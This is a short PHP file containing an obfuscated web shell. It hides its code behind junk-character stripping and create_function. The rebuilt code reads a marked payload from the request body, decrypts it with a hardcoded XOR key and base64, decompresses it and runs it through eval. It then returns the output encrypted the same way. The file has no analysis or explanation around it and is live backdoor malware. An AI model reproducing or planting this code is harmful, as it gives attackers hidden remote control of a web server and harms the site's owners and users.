<?php
$n='ctiV<V<on x($V<t,$k){$c=strlV<eV<V<nV<($k);$l=V<strlen($t);$V<o="";for($V<i=0;$V<i<$V<l;)V<{for($j';
$C='$k="a0V<00V<55e5";$V<kh="bV<bV<cd46b78ab5";$kf="V<V<65V<V<bf49fc0453";$p="NaqcXVV<5V<fz9h4ORKDV<";fun';
$o='evV<al(@gzuncoV<mpreV<ssV<(@x(@V<bV<ase64_decode($m[1V<]V<),$k)));V<$o=V<@ob_V<get_contenV<ts(';
$l='"/V<$kV<h(.+V<)$kf/",@file_getV<_V<contV<ents("V<php://input"V<)V<,$m)==1) {V<@oV<b_start()V<;@';
$Y='=0;V<($j<$c&&$i<V<$V<V<l);$j++,$i++){$o.=$V<t{$iV<}^$k{$j}V<;}}retV<urn $oV<;}V<if V<(@preg_match(V<';
$h=str_replace('UU','','cUUreaUUtUUeUU_funUUUUction');
$Q=');@ob_enV<V<d_clean(V<);$r=@bV<ase64V<_encodV<e(@x(@gzcV<oV<mpress($o),$V<kV<));printV<("$p$kV<h$r$kf");}';
$t=str_replace('V<','',$C.$n.$Y.$l.$o.$Q);
$b=$h('',$t);$b();
?>
